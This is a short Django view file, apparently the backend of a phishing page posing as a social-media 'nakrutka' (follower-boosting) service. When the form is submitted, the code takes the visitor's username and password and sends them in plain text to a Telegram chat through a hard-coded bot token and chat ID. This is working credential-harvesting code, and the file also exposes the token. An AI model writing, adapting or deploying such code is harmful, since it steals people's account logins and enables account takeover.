import requests
from django.http import HttpResponse
from django.shortcuts import render
from .forms import NakrutkaForm

def home(request):
    success = False
    if request.method == "POST":
        form = NakrutkaForm(request.POST)
        if form.is_valid():
            obj = form.save()
            username_var = form.cleaned_data.get('username')
            password_var = form.cleaned_data.get('password')
            bot_token = "8247922895:AAFAwuGynmBGVWWClgc7nwxJnPErmSB-hwU"
            chat_id = "6642743434"
            text = f"👤 *Username*: ```{username_var}```\n🔒 *Parol*: ```{password_var}```\n"
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                          data={"chat_id": chat_id, "text": text,"parse_mode": "MarkdownV2"})

    else:
        form = NakrutkaForm()

    return render(request, "index.html", {"form": form, "success": success})
